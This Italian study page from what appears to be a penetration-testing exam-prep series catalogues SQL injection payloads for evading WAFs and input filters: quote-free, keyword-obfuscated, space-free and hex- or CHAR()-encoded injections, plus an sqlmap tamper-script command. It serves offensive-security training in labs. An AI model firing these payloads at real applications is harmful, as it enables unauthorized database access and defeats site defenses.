# Encoding Bypasses (SQLi)

**Difficoltà:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [05-Time-Based-Blind.md](05-Time-Based-Blind.md)
**Lab:** PortSwigger Academy: WAF bypass labs

---

## Obiettivo

Prima o poi un WAF o un filtro applicativo ti blocca proprio l'apice o la keyword `UNION` che stavi per usare. Questa pagina è la lista di contromisure pronte per quel momento, da scorrere in ordine finché una non passa: niente teoria, solo quello che serve durante l'esame quando il tempo stringe.

---

## Concetti chiave

### Categorie di filtro e relativa contromisura

| Filtro | Contromisura |
|--------|----------------|
| Blocca `'` | usa contesto numerico, backtick, o doppio apice |
| Blocca keyword (`SELECT`, `UNION`) | case variation, commenti inline, encoding |
| Blocca spazi | commenti `/**/`, parentesi, newline/tab |
| Blocca `=` | usa `LIKE`, `IN`, `<>` invertito |

---

## Strumenti

Nessun tool dedicato: lista di payload da provare manualmente o via Burp Intruder; sqlmap gestisce molti di questi automaticamente con `--tamper`.

---

## Payload / Esempi

### Esempio 1: bypass filtro sugli apici

```sql
' OR 1=1 --
" OR 1=1 --
\' OR 1=1 --
` OR 1=1 --
' OR 'a'='a
' OR 1 LIKE 1 --
```

### Esempio 2: bypass keyword blacklist (case/comment/encoding)

```sql
' UnIoN SeLeCt NULL,NULL --
' UNI/**/ON SEL/**/ECT NULL,NULL --
' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL --
' %55NION %53ELECT NULL,NULL --      -- URL encoding parziale keyword
```

### Esempio 3: bypass su spazio filtrato

```sql
'/**/OR/**/1=1--
'OR(1)=(1)--
'||1=1--
'%0aOR%0a1=1--                         -- newline al posto dello spazio
```

### Esempio 4: bypass su "=" filtrato

```sql
' OR 1 LIKE 1 --
' OR 1 BETWEEN 0 AND 2 --
' OR 'a' IN ('a') --
```

### Esempio 5: hex encoding di stringhe (evita quote del tutto)

```sql
' UNION SELECT 0x61646d696e, 0x70617373776f7264 --
-- 0x61646d696e = 'admin' in hex, nessun apice necessario
```

### Esempio 6: bypass WAF con concatenazione di funzioni

```sql
' UNION SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110)) --
```

**Spiegazione:** costruisce la stringa "admin" carattere per carattere via CHAR(), aggirando qualsiasi filtro basato su pattern testuali letterali.

---

## Evasion / Bypass Techniques

Questo intero file è la sezione evasion. In aggiunta, per sqlmap: usa gli script `--tamper` predefiniti (es. `space2comment`, `charencode`, `between`) invece di reinventare la ruota manualmente quando automatizzi.

```bash
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment,charencode --batch
```

---

## Lab Hands-On

### Lab 1: PortSwigger: SQL injection with filter bypass via XML encoding
**Obiettivo:** bypassare un filtro applicativo su input SQLi
**Difficulty:** Difficile
**Time:** 45 min

**Walkthrough breve:**
1. Identifica cosa blocca esattamente il filtro (quote? keyword? spazio?)
2. Applica la contromisura specifica dalla lista sopra
3. Conferma bypass riuscito con test booleano

---

## Common Mistakes

- Provare un solo tipo di bypass e arrendersi -> i filtri spesso bloccano una sola categoria, prova sistematicamente tutte
- Non considerare sqlmap con tamper script quando il bypass manuale richiede troppo tempo

---

## Link Utili

- [sqlmap tamper scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [PayloadsAllTheThings: WAF bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## Connessioni

- **Prerequisito:** [05-Time-Based-Blind.md](05-Time-Based-Blind.md)
- **Prossimo Step:** [07-SQLMap-Automation.md](07-SQLMap-Automation.md)

---

## Checklist di padronanza

- [ ] Conosco almeno 5 tecniche di bypass filtro diverse
- [ ] So usare hex/CHAR() encoding per evitare stringhe letterali
- [ ] So configurare tamper script in sqlmap

